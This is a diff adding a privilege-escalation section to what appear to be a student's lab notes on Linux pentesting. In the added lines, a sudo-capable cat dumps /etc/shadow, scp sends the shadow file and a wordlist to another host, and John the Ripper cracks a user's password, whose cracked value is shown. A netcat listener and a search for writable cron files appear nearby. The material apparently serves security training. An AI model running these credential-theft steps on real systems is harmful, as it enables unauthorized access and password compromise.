@@ -28,6 +28,24 @@ Dot in Path
 - From lin-ops
       - nc -lp 5555
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Privilege Escalation
+- "cat" is a sudo-capable command
+      - cat /etc/shadow > /tmp/shadow
+
+- Locate File containing Possible Passwords
+
+- scp shadow file and password files
+      - scp /home/billybob/10-million-password-list-top-10000.txt student@10.50.31.252:.
+      - scp /tmp/shadow student@10.50.31.252:.
+
+- John the ripper
+      - john --wordlist=10-million-password-list-top-10000.txt shadow
+      - Output: ghjcnbnenrf      (zeus)
+                    |               |
+   Password ________|               |_________ Username
+
+- Exit out of your ssh session and log back in with new credentials
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 CronJobs
 
 find /var/spool/cron/crontabs /etc/cron* -writable -ls - finds any cron file or directory that can be written to.
